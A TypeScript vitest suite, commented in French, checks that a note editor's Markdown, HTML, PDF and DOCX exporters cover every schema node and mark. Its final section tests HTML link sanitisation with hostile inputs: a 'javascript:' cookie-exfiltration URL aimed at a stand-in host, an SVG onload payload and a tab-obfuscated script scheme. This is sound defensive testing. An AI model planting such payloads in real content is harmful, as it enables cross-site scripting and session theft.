/**
 * COUVERTURE D'EXPORT — le garde-fou qui empêche la prochaine divergence.
 *
 * Le défaut réparé ici n'était pas « quelques `case` mal nommés » : c'était le
 * fait que RIEN ne reliait les sérialiseurs d'export au schéma réel des notes.
 * `noteExportService` traitait un nœud `mermaid` (le vrai s'appelle
 * `mermaidBlock`), lisait `attrs.content` pour une formule (l'attribut est
 * `latex`), gérait un nœud `toggle` (le vrai est `toggleBlock`) — et chacune de
 * ces erreurs était SILENCIEUSE, parce qu'un `case` qui ne correspond à rien
 * tombe dans le `default`, et que le `default` d'un nœud `atom:` ne produit
 * rien du tout : tout le contenu de ces blocs vit dans leurs `attrs`. Un
 * diagramme, une formule, une base, un calendrier disparaissaient de l'export
 * sans le moindre message. Les colonnes — l'argument produit numéro un face à
 * la concurrence — s'aplatissaient en un seul flux de texte.
 *
 * Corriger les noms ne protège de rien : la prochaine extension ajoutée au
 * schéma repartira dans le `default`. C'est CETTE suite qui protège :
 *
 *   1. elle DÉRIVE la liste des nœuds du schéma réel, via le même
 *      `buildNoteSchemaExtensions()` que l'éditeur, jamais d'une liste
 *      recopiée à la main ;
 *   2. elle exige que chacun soit traité par un `case` EXPLICITE dans les
 *      quatre sérialiseurs (markdown, HTML, PDF, DOCX) ;
 *   3. elle exige, en sens inverse, qu'aucun `case` ne porte un nom de nœud
 *      qui n'existe nulle part — c'est le test qui aurait attrapé
 *      `mermaid` / `toggle` dès leur écriture ;
 *   4. elle rend un document de démonstration par type de nœud et vérifie que
 *      le contenu SURVIT dans les quatre formats. Une correction fondée sur un
 *      mauvais nom d'attribut échoue ici, pas en production.
 *
 * LANCEUR — vitest (environnement `node`) : le graphe d'import atteint TipTap
 * et des vues React, mais `getSchema()` ne les instancie jamais, il ne lit que
 * les specs. Jest CRA ne peut pas exécuter cette suite (`@tiptap/pm` est publié
 * en ESM et `node_modules` n'est pas transformé).
 *
 *   npx vitest run src/services/notes/__tests__/noteExportCoverage.vitest.ts
 */

import { describe, it, expect, beforeAll } from 'vitest';
import { readFileSync } from 'fs';
import { resolve } from 'path';

/**
 * Bouchons minimaux, posés AVANT tout import du service : le magasin Redux
 * (atteint par la résolution des titres de notes liées) et les vues de nœuds
 * lisent `localStorage` au chargement du module. Rien de tout cela n'intervient
 * dans la sérialisation.
 */
beforeAll(() => {
  const cells = new Map<string, string>();
  (globalThis as unknown as { localStorage: unknown }).localStorage = {
    getItem: (k: string) => (cells.has(k) ? cells.get(k)! : null),
    setItem: (k: string, v: string) => void cells.set(k, String(v)),
    removeItem: (k: string) => void cells.delete(k),
    clear: () => cells.clear(),
    key: () => null,
    get length() {
      return cells.size;
    },
  };
  (globalThis as unknown as { window: unknown }).window = globalThis;
});

// ==================== Accès différé aux modules ====================

interface JsonNode {
  type: string;
  content?: JsonNode[];
  text?: string;
  marks?: { type: string; attrs?: Record<string, unknown> }[];
  attrs?: Record<string, unknown>;
}

async function loadSerializers() {
  const { __exportSerializers } = await import('../noteExportService');
  return __exportSerializers;
}

/** Noms des nœuds et des marques du schéma RÉEL de l'éditeur de notes. */
async function loadSchemaNames() {
  const { getSchema } = await import('@tiptap/core');
  const { buildNoteSchemaExtensions } =
    await import('../../../renderer/components/notes/extensions/schemaExtensions');
  const schema = getSchema(buildNoteSchemaExtensions() as never);
  return {
    nodes: Object.keys(schema.nodes).sort(),
    marks: Object.keys(schema.marks).sort(),
  };
}

// ==================== Rendu des quatre formats ====================

type Format = 'markdown' | 'html' | 'pdf' | 'docx';
const FORMATS: Format[] = ['markdown', 'html', 'pdf', 'docx'];

/**
 * Texte produit par chaque sérialiseur pour un document donné.
 *
 * Le PDF et le DOCX passent par leur représentation INTERMÉDIAIRE (lignes,
 * blocs) et non par le fichier empaqueté : un .pdf ou un .docx ne se relit pas,
 * et c'est précisément cette opacité qui a laissé le défaut prospérer pendant
 * des mois. On éprouve donc le sérialiseur, pas l'empaqueteur.
 */
async function renderAll(doc: JsonNode): Promise<Record<Format, string>> {
  const s = await loadSerializers();
  const node = doc as never;
  return {
    markdown: s.nodeToMarkdown(node),
    html: s.nodeToHtml(node),
    pdf: s
      .nodeToPdfLines(node)
      .map((l) => l.text)
      .join('\n'),
    docx: s
      .nodeToDocxBlocks(node)
      .map((b) => b.runs.map((r) => r.text).join(''))
      .join('\n'),
  };
}

const doc = (...content: JsonNode[]): JsonNode => ({ type: 'doc', content });
const para = (text: string): JsonNode => ({
  type: 'paragraph',
  content: [{ type: 'text', text }],
});

// ==================== Nœuds de structure ====================

/**
 * LISTE D'EXCLUSION EXPLICITE — nœuds sans document de démonstration propre.
 *
 * Aucun de ces nœuds n'est « ignoré » : tous ont un `case` dans les quatre
 * sérialiseurs (le test de couverture statique plus bas l'exige sans
 * exception). Ils n'ont simplement pas de document de démonstration à eux,
 * parce qu'ils n'existent PAS seuls dans un document valide : ProseMirror ne
 * les accepte qu'à l'intérieur de leur parent, et c'est le document de ce
 * parent qui les éprouve. La valeur dit lequel.
 */
const STRUCTURAL_NODES: Record<string, string> = {
  doc: 'la racine — c’est elle qu’on sérialise dans chaque cas',
  text: 'porté par tous les documents de démonstration textuels',
  hardBreak: 'éprouvé par le document `paragraph` (saut de ligne dur)',
  listItem: 'éprouvé par `bulletList` et `orderedList`',
  tableRow: 'éprouvé par `table`',
  tableCell: 'éprouvé par `table`',
  tableHeader: 'éprouvé par `table`',
  column: 'éprouvé par `columns`',
  toggleSummary: 'éprouvé par `toggleBlock` (c’est son premier enfant obligatoire)',
};

/**
 * Types ACCEPTÉS par les sérialiseurs sans exister dans le schéma des notes.
 *
 * `image` n'est pas un nœud de l'éditeur (les images sont des `fileEmbed`).
 * L'importateur HTML n'en fabrique PLUS — sa branche `if (tag === 'img')`
 * produit désormais un `fileEmbed` pour les data-URI d'image et un lien pour
 * le reste (2026-08-26) — mais l'export lit le JSON PERSISTÉ, pas le schéma :
 * les notes importées AVANT ce correctif en contiennent toujours. Retirer ce
 * `case` rendrait leurs images invisibles à l'export sans rien réparer. À ne
 * supprimer qu'après une migration du contenu déjà importé.
 */
const OUT_OF_SCHEMA_TYPES: Record<string, string> = {
  image: 'produit par noteImportService (import HTML) ; absent du schéma de l’éditeur',
};

/**
 * Noms de marques ProseMirror historiques, encore portés par du contenu
 * importé. `bold`/`italic` sont les noms du schéma ; `strong`/`em` sont ceux
 * que produisaient les anciennes versions et certains importateurs.
 */
const MARK_ALIASES: Record<string, string> = {
  strong: 'ancien nom ProseMirror de `bold`',
  em: 'ancien nom ProseMirror de `italic`',
};

// ==================== Documents de démonstration ====================

interface NodeCase {
  /** Le nœud tel qu'il apparaît dans un document réel (parent compris si besoin). */
  node: JsonNode;
  /** Chaînes qui doivent apparaître dans les QUATRE formats. */
  markers: string[];
  /**
   * Attentes supplémentaires par format — pour les blocs qu'un format rend
   * fidèlement et qu'un autre doit DÉGRADER (les colonnes), ou qui n'ont
   * aucune écriture commune (le sommaire).
   */
  perFormat?: Partial<Record<Format, string[]>>;
}

/** Base de données inline minimale, au format que `parseDbData` accepte. */
const DB_DATA = JSON.stringify({
  properties: [{ id: 'p1', name: 'Task', type: 'text' }],
  rows: [
    {
      id: 'r1',
      cells: { p1: 'Write docs' },
      createdAt: '2026-01-01T00:00:00.000Z',
      updatedAt: '2026-01-01T00:00:00.000Z',
    },
  ],
});

const NODE_CASES: Record<string, NodeCase> = {
  paragraph: {
    node: {
      type: 'paragraph',
      content: [
        { type: 'text', text: 'Plain paragraph' },
        { type: 'hardBreak' },
        { type: 'text', text: 'after break' },
      ],
    },
    markers: ['Plain paragraph', 'after break'],
  },
  heading: {
    node: {
      type: 'heading',
      attrs: { level: 2 },
      content: [{ type: 'text', text: 'Heading two' }],
    },
    markers: ['Heading two'],
  },
  bulletList: {
    node: { type: 'bulletList', content: [{ type: 'listItem', content: [para('Bullet item')] }] },
    markers: ['Bullet item'],
  },
  orderedList: {
    node: {
      type: 'orderedList',
      attrs: { start: 1 },
      content: [{ type: 'listItem', content: [para('Ordered item')] }],
    },
    markers: ['Ordered item'],
  },
  taskList: {
    node: {
      type: 'taskList',
      content: [
        { type: 'taskItem', attrs: { checked: false }, content: [para('Task list entry')] },
      ],
    },
    markers: ['Task list entry'],
  },
  taskItem: {
    node: {
      type: 'taskList',
      content: [{ type: 'taskItem', attrs: { checked: true }, content: [para('Checked task')] }],
    },
    markers: ['Checked task'],
  },
  codeBlock: {
    node: {
      type: 'codeBlock',
      attrs: { language: 'javascript' },
      content: [{ type: 'text', text: 'const answer = 42;' }],
    },
    markers: ['const answer = 42;'],
  },
  blockquote: {
    node: { type: 'blockquote', content: [para('Quoted sentence')] },
    markers: ['Quoted sentence'],
  },
  horizontalRule: {
    node: { type: 'horizontalRule' },
    markers: [],
    // Chaque format a SON trait : il n'existe pas d'écriture commune.
    perFormat: { markdown: ['---'], html: ['<hr>'], pdf: ['────'], docx: ['─'] },
  },
  table: {
    node: {
      type: 'table',
      content: [
        {
          type: 'tableRow',
          content: [
            { type: 'tableHeader', content: [para('Head A')] },
            { type: 'tableHeader', content: [para('Head B')] },
          ],
        },
        {
          type: 'tableRow',
          content: [
            { type: 'tableCell', content: [para('Cell A')] },
            { type: 'tableCell', content: [para('Cell B')] },
          ],
        },
      ],
    },
    markers: ['Head A', 'Head B', 'Cell A', 'Cell B'],
  },
  callout: {
    node: {
      type: 'callout',
      attrs: { type: 'warning', collapsed: false, title: 'Watch out' },
      content: [para('Callout body')],
    },
    markers: ['Callout body', 'Watch out'],
  },
  mathBlock: {
    // L'attribut est `latex`, pas `content` : c'est l'erreur exacte qui vidait
    // toutes les formules des exports Markdown et HTML.
    node: { type: 'mathBlock', attrs: { latex: 'E = mc^2' } },
    markers: ['E = mc^2'],
  },
  mathInline: {
    node: {
      type: 'paragraph',
      content: [
        { type: 'text', text: 'Pythagoras: ' },
        { type: 'mathInline', attrs: { latex: 'a^2 + b^2 = c^2' } },
      ],
    },
    markers: ['a^2 + b^2 = c^2'],
  },
  mermaidBlock: {
    // Nœud `mermaidBlock` (pas `mermaid`), attribut `code` (pas `content`).
    node: { type: 'mermaidBlock', attrs: { code: 'graph TD\n  A[Start] --> B[End]' } },
    markers: ['graph TD'],
  },
  dataviewBlock: {
    node: { type: 'dataviewBlock', attrs: { query: 'TABLE title FROM notes' } },
    markers: ['TABLE title FROM notes'],
  },
  columns: {
    node: {
      type: 'columns',
      attrs: { count: 2 },
      content: [
        { type: 'column', content: [para('Left side')] },
        { type: 'column', content: [para('Right side')] },
      ],
    },
    // Le contenu des deux colonnes doit survivre partout…
    markers: ['Left side', 'Right side'],
    // …et la DÉGRADATION doit être annoncée là où elle a lieu. HTML est le
    // seul format qui rend vraiment deux colonnes côte à côte.
    perFormat: {
      markdown: ['Column 1 of 2', 'Column 2 of 2'],
      pdf: ['Column 1 of 2', 'Column 2 of 2'],
      docx: ['Column 1 of 2', 'Column 2 of 2'],
      html: ['class="column"'],
    },
  },
  toggleBlock: {
    node: {
      type: 'toggleBlock',
      attrs: { open: true },
      content: [
        { type: 'toggleSummary', content: [{ type: 'text', text: 'Toggle summary' }] },
        para('Toggle body'),
      ],
    },
    // Le corps d'un volet REPLIÉ doit sortir quand même : un export n'a pas
    // d'état d'ouverture, et perdre ce qui était fermé serait une perte sèche.
    markers: ['Toggle summary', 'Toggle body'],
  },
  fileEmbed: {
    node: {
      type: 'fileEmbed',
      attrs: { fileId: 'f1', fileName: 'report.pdf', fileType: 'application/pdf', src: null },
    },
    markers: ['report.pdf'],
  },
  bookmark: {
    node: {
      type: 'bookmark',
      attrs: {
        url: 'https://example.com/page',
        title: 'Bookmark title',
        description: 'Bookmark description',
        domain: 'example.com',
      },
    },
    markers: ['Bookmark title', 'https://example.com/page'],
  },
  embedUrl: {
    node: {
      type: 'embedUrl',
      attrs: { url: 'https://vid.example/1', title: 'Video title', embedType: 'link' },
    },
    markers: ['Video title', 'https://vid.example/1'],
  },
  subPage: {
    node: { type: 'subPage', attrs: { noteId: 'n1', title: 'Child page', icon: '' } },
    markers: ['Child page'],
  },
  transclusion: {
    // La RÉFÉRENCE doit survivre, pas seulement l'aperçu : c'est elle qui fait
    // le lien, et l'ancre de bloc est ce que le schéma partagé protège.
    node: {
      type: 'transclusion',
      attrs: { noteId: 'n2', noteTitle: 'Source note', blockId: 'abc123', preview: 'Preview text' },
    },
    markers: ['![[Source note^abc123]]'],
  },
  tableOfContents: {
    node: { type: 'tableOfContents' },
    markers: [],
    perFormat: {
      // Convention Markdown répandue : le sommaire est régénéré à la lecture.
      markdown: ['[[TOC]]'],
      html: ['Table of Contents'],
      pdf: ['Table of Contents'],
      docx: ['Table of Contents'],
    },
  },
  calendarBlock: {
    node: {
      type: 'calendarBlock',
      attrs: {
        title: 'Sprint',
        events: JSON.stringify([{ id: 'e1', date: '2026-01-02', text: 'Kickoff', color: 'blue' }]),
      },
    },
    markers: ['Sprint', '2026-01-02', 'Kickoff'],
  },
  inlineDatabase: {
    node: { type: 'inlineDatabase', attrs: { title: 'Backlog', data: DB_DATA } },
    markers: ['Task', 'Write docs'],
  },
  footnote: {
    node: {
      type: 'paragraph',
      content: [
        { type: 'text', text: 'See ' },
        { type: 'footnote', attrs: { content: 'A footnote' } },
      ],
    },
    markers: ['A footnote'],
  },
  inlineDate: {
    node: {
      type: 'paragraph',
      content: [
        { type: 'text', text: 'Due ' },
        { type: 'inlineDate', attrs: { date: '2026-03-04' } },
      ],
    },
    markers: ['2026-03-04'],
  },
  // Une mention EXPORTÉE est du texte : le nom, jamais l’identifiant — un
  // fichier exporté quitte le coffre, et rien ne dit que celui qui le lira a
  // le droit de savoir qui est « u-42 ».
  mention: {
    node: {
      type: 'paragraph',
      content: [
        { type: 'text', text: 'Vu avec ' },
        { type: 'mention', attrs: { userId: 'u-42', label: 'Nour' } },
      ],
    },
    markers: ['@Nour'],
  },
};

/** Tous les types présents dans un document de démonstration. */
function typesIn(node: JsonNode, into: Set<string> = new Set()): Set<string> {
  into.add(node.type);
  for (const child of node.content || []) typesIn(child, into);
  return into;
}

// ==================== Lecture de la source ====================

const SERVICE_PATH = resolve(__dirname, '../noteExportService.ts');

/**
 * Corps d'une fonction, délimité par comptage d'accolades. On lit la SOURCE
 * parce que c'est la seule façon de prouver qu'un type est traité par un `case`
 * EXPLICITE plutôt que d'être avalé par le `default` — un `default` qui recurse
 * dans les enfants produit d'ailleurs souvent une sortie non vide, donc aucune
 * assertion sur le rendu ne peut le distinguer d'un vrai traitement.
 */
function functionBody(source: string, name: string): string {
  const signature = source.indexOf(`function ${name}(`);
  if (signature < 0) throw new Error(`fonction introuvable dans la source : ${name}`);
  const open = source.indexOf('{', signature);
  let depth = 0;
  for (let i = open; i < source.length; i++) {
    if (source[i] === '{') depth++;
    else if (source[i] === '}') {
      depth--;
      if (depth === 0) return source.slice(open, i + 1);
    }
  }
  throw new Error(`corps non refermé : ${name}`);
}

/** Étiquettes `case '<x>':` d'un corps de fonction. */
function caseLabels(body: string): string[] {
  return [...body.matchAll(/case\s+'([^']+)'\s*:/g)].map((m) => m[1]);
}

/**
 * Les quatre surfaces de sérialisation, et les fonctions qui les composent.
 * Le PDF réutilise le sérialiseur inline du Markdown (`inlineContentToMd`) —
 * c'est un choix du service, pas un oubli : un flux de lignes jsPDF n'a pas de
 * style par fragment, les marques y restent écrites en notation Markdown.
 */
const SURFACES: Record<Format, string[]> = {
  markdown: ['nodeToMarkdown', 'inlineContentToMd'],
  html: ['nodeToHtml', 'inlineContentToHtml'],
  pdf: ['nodeToPdfLines', 'inlineContentToMd'],
  docx: ['nodeToDocxBlocks', 'docxRunsFromInline'],
};

function handledTypes(source: string, format: Format): string[] {
  return SURFACES[format].flatMap((fn) => caseLabels(functionBody(source, fn)));
}

// ==================== Tests ====================

describe('couverture des sérialiseurs d’export', () => {
  it('traite explicitement CHAQUE nœud du schéma dans les quatre formats', async () => {
    const { nodes } = await loadSchemaNames();
    const source = readFileSync(SERVICE_PATH, 'utf8');

    for (const format of FORMATS) {
      const handled = new Set(handledTypes(source, format));
      const missing = nodes.filter((n) => !handled.has(n));
      // Message explicite : le développeur qui ajoute une extension doit lire
      // le nom du nœud oublié, pas un « expected [] to equal [...] ».
      expect(missing, `nœuds sans \`case\` dans le sérialiseur ${format}`).toEqual([]);
    }
  });

  it('n’accepte aucun `case` portant un nom de nœud inexistant', async () => {
    const { nodes } = await loadSchemaNames();
    const known = new Set([...nodes, ...Object.keys(OUT_OF_SCHEMA_TYPES)]);
    const source = readFileSync(SERVICE_PATH, 'utf8');

    for (const format of FORMATS) {
      const dead = handledTypes(source, format).filter((t) => !known.has(t));
      // C'est CE test qui aurait attrapé `case 'mermaid'`, `case 'toggle'` et
      // `case 'image'` le jour où ils ont été écrits.
      expect(dead, `\`case\` inutiles dans le sérialiseur ${format}`).toEqual([]);
    }
  });

  it('couvre le schéma par un document de démonstration ou une exclusion documentée', async () => {
    const { nodes } = await loadSchemaNames();
    const covered = new Set<string>();
    for (const c of Object.values(NODE_CASES)) for (const t of typesIn(c.node)) covered.add(t);

    const orphans = nodes.filter((n) => !covered.has(n) && !(n in STRUCTURAL_NODES));
    expect(orphans, 'nœuds sans document de démonstration ni exclusion').toEqual([]);

    // Symétrie : une exclusion qui ne correspond plus à aucun nœud est un
    // commentaire périmé, et un `NODE_CASES` fantôme n'éprouve rien.
    expect(Object.keys(STRUCTURAL_NODES).filter((n) => !nodes.includes(n))).toEqual([]);
    expect(Object.keys(NODE_CASES).filter((n) => !nodes.includes(n))).toEqual([]);
  });

  // Un test par type de nœud : l'échec nomme le bloc ET le format fautifs.
  for (const [name, testCase] of Object.entries(NODE_CASES)) {
    it(`préserve le contenu de \`${name}\` dans les quatre formats`, async () => {
      // Le nœud doit bien apparaître dans son propre document, sans quoi le
      // test se contenterait de vérifier un parent.
      expect(typesIn(testCase.node).has(name), `\`${name}\` absent de son document`).toBe(true);

      const rendered = await renderAll(doc(testCase.node));
      for (const format of FORMATS) {
        const out = rendered[format];
        expect(out.trim(), `${format} n’a rien produit pour \`${name}\``).not.toBe('');
        for (const marker of [...testCase.markers, ...(testCase.perFormat?.[format] ?? [])]) {
          expect(out, `${format} / \`${name}\` : « ${marker} » manquant`).toContain(marker);
        }
      }
    });
  }
});

describe('couverture des marques d’export', () => {
  /**
   * LISTE D'EXCLUSION EXPLICITE des marques, par format.
   *
   * Une marque exclue n'est pas un oubli, c'est une décision :
   *  - `comment` est une ANNOTATION d'atelier (fil de discussion attaché au
   *    texte), pas du contenu. L'exporter reviendrait à livrer les
   *    commentaires internes à qui reçoit le document.
   *  - `textStyle` porte couleur, taille et famille de police. Markdown n'a
   *    aucune de ces notions ; les y écrire en HTML brut polluerait aussi le
   *    PDF, qui dérive son rendu inline du Markdown. HTML restitue les trois ;
   *    DOCX ne restitue QUE la couleur et la taille (`DocxRun` n'a pas de
   *    champ de police) — voir `MARK_ATTR_EXCLUSIONS`.
   */
  const MARK_EXCLUSIONS: Record<string, Record<string, string>> = {
    markdown: {
      comment: 'annotation d’atelier, jamais du contenu',
      textStyle: 'Markdown n’a ni couleur ni police ; conservé en HTML, partiellement en DOCX',
    },
    html: { comment: 'annotation d’atelier, jamais du contenu' },
    docx: { comment: 'annotation d’atelier, jamais du contenu' },
  };

  /** Attributs donnant à chaque marque une trace observable. */
  const MARK_ATTRS: Record<string, Record<string, unknown>> = {
    link: { href: 'https://example.com/target' },
    highlight: { color: 'yellow' },
    textStyle: { color: '#ff0000', fontSize: '20px', fontFamily: 'Georgia' },
    comment: { commentId: 'c1' },
  };

  it('laisse une trace de chaque marque du schéma, ou l’exclut explicitement', async () => {
    const { marks } = await loadSchemaNames();
    const s = await loadSerializers();

    const plain = doc(para('marked text'));
    const bare = {
      markdown: s.nodeToMarkdown(plain as never),
      html: s.nodeToHtml(plain as never),
      docx: JSON.stringify(s.nodeToDocxBlocks(plain as never)),
    };

    for (const mark of marks) {
      const marked = doc({
        type: 'paragraph',
        content: [
          { type: 'text', text: 'marked text', marks: [{ type: mark, attrs: MARK_ATTRS[mark] }] },
        ],
      });
      const got = {
        markdown: s.nodeToMarkdown(marked as never),
        html: s.nodeToHtml(marked as never),
        docx: JSON.stringify(s.nodeToDocxBlocks(marked as never)),
      };

      for (const format of ['markdown', 'html', 'docx'] as const) {
        if (MARK_EXCLUSIONS[format][mark]) {
          // Une exclusion se VÉRIFIE : si la marque se met à produire quelque
          // chose, c'est le commentaire qui est faux.
          expect(got[format], `${format} : \`${mark}\` est déclarée exclue`).toBe(bare[format]);
          continue;
        }
        expect(got[format], `${format} : \`${mark}\` ne laisse aucune trace`).not.toBe(
          bare[format]
        );
      }
    }
  });

  /**
   * EXCLUSIONS PAR ATTRIBUT, clé `marque.attribut`.
   *
   * POURQUOI ce second niveau — le test par MARQUE ci-dessus est satisfait dès
   * qu'UN attribut laisse une trace. `textStyle` en porte trois : tant que la
   * couleur fonctionne, une régression sur la taille passerait inaperçue, et
   * le fait que la police soit perdue en DOCX ne se voyait nulle part alors
   * que le commentaire d'exclusion promettait le contraire.
   */
  const MARK_ATTR_EXCLUSIONS: Record<string, Record<string, string>> = {
    markdown: {},
    html: {},
    docx: {
      'textStyle.fontFamily':
        'DocxRun n’a pas de champ de police ; docxRunsFromInline lit color et fontSize seulement',
    },
  };

  it('laisse une trace de chaque ATTRIBUT de marque, ou l’exclut nommément', async () => {
    const { marks } = await loadSchemaNames();
    const s = await loadSerializers();

    const plain = doc(para('marked text'));
    const bare = {
      markdown: s.nodeToMarkdown(plain as never),
      html: s.nodeToHtml(plain as never),
      docx: JSON.stringify(s.nodeToDocxBlocks(plain as never)),
    };

    for (const mark of marks) {
      const attrs = MARK_ATTRS[mark];
      if (!attrs) continue;

      for (const [attr, value] of Object.entries(attrs)) {
        // La marque est rendue avec CET attribut SEUL : impossible qu'un
        // attribut voisin la sauve.
        const marked = doc({
          type: 'paragraph',
          content: [
            {
              type: 'text',
              text: 'marked text',
              marks: [{ type: mark, attrs: { [attr]: value } }],
            },
          ],
        });
        const got = {
          markdown: s.nodeToMarkdown(marked as never),
          html: s.nodeToHtml(marked as never),
          docx: JSON.stringify(s.nodeToDocxBlocks(marked as never)),
        };

        for (const format of ['markdown', 'html', 'docx'] as const) {
          // Marque entièrement exclue de ce format : rien à exiger de ses
          // attributs, l'exclusion de marque est déjà vérifiée plus haut.
          if (MARK_EXCLUSIONS[format][mark]) continue;

          const key = `${mark}.${attr}`;
          if (MARK_ATTR_EXCLUSIONS[format][key]) {
            expect(got[format], `${format} : \`${key}\` est déclaré exclu`).toBe(bare[format]);
            continue;
          }
          expect(got[format], `${format} : \`${key}\` ne laisse aucune trace`).not.toBe(
            bare[format]
          );
        }
      }
    }
  });

  it('n’accepte aucune marque traitée sous un nom inexistant', async () => {
    const { marks } = await loadSchemaNames();
    const known = new Set([...marks, ...Object.keys(MARK_ALIASES)]);
    const source = readFileSync(SERVICE_PATH, 'utf8');

    for (const fn of ['marksToMd', 'marksToHtml']) {
      const dead = caseLabels(functionBody(source, fn)).filter((m) => !known.has(m));
      expect(dead, `marques inconnues traitées par ${fn}`).toEqual([]);
    }
  });

  it('ne garde pas d’exclusion ni d’alias périmé', async () => {
    const { marks } = await loadSchemaNames();
    for (const [format, excluded] of Object.entries(MARK_EXCLUSIONS)) {
      expect(
        Object.keys(excluded).filter((m) => !marks.includes(m)),
        `exclusions ${format} sans marque correspondante`
      ).toEqual([]);
    }
    // Un alias qui deviendrait un vrai nom de marque n'aurait plus rien d'un alias.
    expect(Object.keys(MARK_ALIASES).filter((m) => marks.includes(m))).toEqual([]);
  });
});

describe('empaquetage réel des quatre formats', () => {
  /**
   * Les sérialiseurs peuvent être justes et l'export quand même casser : `docx`
   * REFUSE une couleur qui n'est pas en RRGGBB et un `highlight` hors de sa
   * liste fermée, et jette au moment de l'empaquetage — donc à l'export, chez
   * l'utilisateur, jamais pendant l'écriture du code. Ce test fait passer un
   * document contenant TOUS les nœuds du schéma par les quatre points d'entrée
   * publics, et vérifie qu'il en sort un fichier non vide.
   */
  it('produit un fichier pour un document contenant tous les nœuds', async () => {
    const { exportToMarkdown, exportToHTML, exportToPDF, exportToDOCX } =
      await import('../noteExportService');

    const everything = doc(
      ...Object.values(NODE_CASES).map((c) => c.node),
      // Marques comprises : c'est par elles que passent couleur et surlignage,
      // les deux valeurs que `docx` valide à l'empaquetage.
      {
        type: 'paragraph',
        content: [
          {
            type: 'text',
            text: 'lien',
            marks: [{ type: 'link', attrs: { href: 'https://e.example/' } }],
          },
          {
            type: 'text',
            text: 'jaune',
            marks: [{ type: 'highlight', attrs: { color: 'yellow' } }],
          },
          {
            type: 'text',
            text: 'style',
            marks: [{ type: 'textStyle', attrs: { color: '#ff0000', fontSize: '20px' } }],
          },
          // Couleur nommée : Word ne sait pas la lire, elle doit être ÉCARTÉE
          // et non recopiée telle quelle (sinon le .docx est invalide).
          { type: 'text', text: 'rouge', marks: [{ type: 'textStyle', attrs: { color: 'red' } }] },
        ],
      }
    );

    const note = {
      id: 'n1',
      title: 'Export coverage',
      content: JSON.stringify(everything),
      plainText: '',
      linkedNoteIds: [],
      linkedFileIds: [],
      linkedFolderIds: [],
      wordCount: 0,
      createdAt: '2026-01-01T00:00:00.000Z',
      updatedAt: '2026-01-01T00:00:00.000Z',
    } as never;

    expect(exportToMarkdown(note, { format: 'markdown' }).blob.size).toBeGreaterThan(200);
    expect(exportToHTML(note, { format: 'html' }).blob.size).toBeGreaterThan(200);
    expect(exportToPDF(note, { format: 'pdf' }).blob.size).toBeGreaterThan(500);
    // `Packer.toBlob` est la seule étape qui VALIDE les options de run.
    expect((await exportToDOCX(note, { format: 'docx' })).blob.size).toBeGreaterThan(1000);
  });
});

// ==================== Schémas d'URL dans l'export HTML ====================

/**
 * L'export HTML émet des `href`/`src` tirés d'ATTRIBUTS DE NŒUD — donc de
 * contenu qu'un autre membre d'un coffre partagé a pu écrire. `escapeHtml`
 * n'échappe que `& < > "` : il laisse passer `javascript:` intact. Le fichier
 * exporté s'ouvre en `file://`, une origine où un script lit tout.
 *
 * Le test de couverture voisin exige que l'URL SOIT PRÉSENTE ; celui-ci exige
 * qu'un schéma dangereux soit ABSENT. Les deux sont nécessaires : le premier
 * seul pousse dans la mauvaise direction.
 */
describe('assainissement des URL de l’export HTML', () => {
  const HOSTILE = 'javascript:fetch("https://x/"+document.cookie)';

  async function htmlOf(node: JsonNode): Promise<string> {
    const s = await loadSerializers();
    return s.nodeToHtml(doc(node) as never);
  }

  it('refuse un javascript: dans une marque `link`', async () => {
    const html = await htmlOf({
      type: 'paragraph',
      content: [
        { type: 'text', text: 'cliquez', marks: [{ type: 'link', attrs: { href: HOSTILE } }] },
      ],
    });
    expect(html).not.toContain('javascript:');
    // Le TEXTE survit : on retire le piège, pas le contenu.
    expect(html).toContain('cliquez');
  });

  it('refuse un javascript: dans un marque-page et dans une intégration', async () => {
    const bookmark = await htmlOf({
      type: 'bookmark',
      attrs: { url: HOSTILE, title: 'Barème', description: '', domain: '' },
    });
    expect(bookmark).not.toContain('javascript:');
    expect(bookmark).toContain('Barème');

    const embed = await htmlOf({ type: 'embedUrl', attrs: { url: HOSTILE, title: 'Démo' } });
    expect(embed).not.toContain('javascript:');
    expect(embed).toContain('Démo');
  });

  it('refuse un javascript: en `src` de pièce jointe et d’image importée', async () => {
    const embed = await htmlOf({
      type: 'fileEmbed',
      attrs: {
        fileId: '',
        fileName: 'piege.png',
        fileType: 'image/png',
        src: HOSTILE,
        width: null,
      },
    });
    expect(embed).not.toContain('javascript:');

    const image = await htmlOf({ type: 'image', attrs: { src: HOSTILE, alt: 'piege' } });
    expect(image).not.toContain('javascript:');
  });

  it('refuse une data-URI HTML ou SVG, accepte une image', async () => {
    const svg = await htmlOf({
      type: 'image',
      attrs: { src: 'data:image/svg+xml,<svg onload="alert(1)"></svg>', alt: 'x' },
    });
    expect(svg).not.toContain('data:image/svg+xml');

    const png = 'data:image/png;base64,iVBORw0KGgo=';
    const ok = await htmlOf({ type: 'image', attrs: { src: png, alt: 'x' } });
    expect(ok).toContain(png);
  });

  it('déjoue un schéma masqué par des caractères de contrôle', async () => {
    // Tabulation INTERIEURE au schema : les navigateurs l'ignorent, donc
    // « java<TAB>script: » s'execute. Construite par code de caractere
    // pour rester visible a la relecture.
    const sneaky = 'java' + String.fromCharCode(9) + 'script:alert(1)';
    const html = await htmlOf({
      type: 'paragraph',
      content: [{ type: 'text', text: 'x', marks: [{ type: 'link', attrs: { href: sneaky } }] }],
    });
    expect(html).not.toContain('script:');
  });

  it('laisse passer http, https, mailto et les liens relatifs', async () => {
    for (const url of [
      'https://example.com/page',
      'http://example.com',
      'mailto:a@b.c',
      '#ancre',
    ]) {
      const html = await htmlOf({
        type: 'paragraph',
        content: [{ type: 'text', text: 'x', marks: [{ type: 'link', attrs: { href: url } }] }],
      });
      expect(html, url).toContain(`href="${url}"`);
    }
  });
});
